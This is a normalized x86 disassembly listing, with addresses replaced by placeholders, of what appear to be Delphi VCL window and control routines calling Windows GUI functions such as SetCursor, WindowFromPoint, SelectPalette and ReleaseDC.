mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43dcf8
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033cc
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43edb8
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43e6e4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_448ce0
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f08d
mov eax [ rw-data ]
call sub_40321c
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4576d8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_441a58
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43e5b0
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45b344
sub_43f08d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033a8
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
sub_43f11c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d784
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43f150
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43f11c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4403e8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_444978
test eax eax
je r-xdata
mov esi eax
sub_43f198
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41a040
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx ] eax
sub_43f1c0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41a2e0
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_40321c
xor eax eax
mov [ ebx ] eax
sub_43f1e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f210
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_41a508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f2c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43f299
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43f44c
call sub_403a54
call sub_403a54
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a19c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_423c68
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43f2cc
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a508
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f36a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f371
mov eax [ rw-data ]
call sub_41a56c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43f342
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43f44c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423cc4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a19c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423c68
test al al
je r-xdata
sub_43f378
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_43f44c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423898
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_43f3a4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_423e48
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_423e4c
mov eax [ ebp - 0x4 ]
call sub_43f498
mov eax [ rw-data ]
call sub_41a508
mov ebx eax
xor eax eax
push ebp
push sub_43f429
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
call sub_43f210
sub_43f44c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_423e4c
mov edx ebx
mov eax [ rw-data ]
call sub_41a51c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43f498
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440ee8
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43f4c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43f500
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a824
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43f548
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43f604
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f6d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f6d8
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403418
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44fdac
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f58
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fc0
sub_43f6f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f75b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44ce78
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_4408a4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ eax + 0x64 ]
pop eax
call sub_404378
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f762
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov al 0x1
sub_43f768
push ebx
mov ebx eax
mov eax ebx
call sub_44cea0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f79c
push ebx
mov ebx eax
mov eax ebx
call sub_44cef0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404378
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f7d4
push ebx
mov ebx eax
mov eax ebx
call sub_44cf2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f808
push ebx
mov ebx eax
mov eax ebx
call sub_42042c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f830
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4408d4
sub_43f850
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43f870
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fc0
sub_43f894
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4407c4
sub_43f8b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43f8e0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404378
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43f944
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_440220
sub_43f964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44020c
sub_43f984
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43f9a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fb3c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ce4
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_440954
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f4c4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_441818
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43fa7c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035a8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45f25c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
push edi
xor ecx ecx
mov edx 0xb039
call sub_441a58
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_440244
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403418
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_40321c
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_40321c
mov eax [ edi + 0x68 ]
call sub_40321c
mov eax [ edi + 0x64 ]
call sub_408ac8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fb88
test bl bl
jle r-xdata
sub_43fb48
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43fb70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403418
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fbf8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43fef8
sub_43fc18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_40321c
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_442874
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403418
mov edx ebx
mov eax edi
call sub_41fc0c
mov eax ebx
mov si 0xffd9
call sub_403418
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43fce0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ff9c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441a58
sub_43fd74
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fe58
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44085c
jmp r-xdata
xor edx edx
mov eax esi
call sub_43fc18
sub_43fdb8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403418
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43fbf8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403418
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43fe60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_441fe8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_440cec
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43fef8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_441a58
mov eax ebx
mov si 0xffd0
call sub_403418
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403418
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43fef8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_440014
push ebx
push esi
mov esi eax
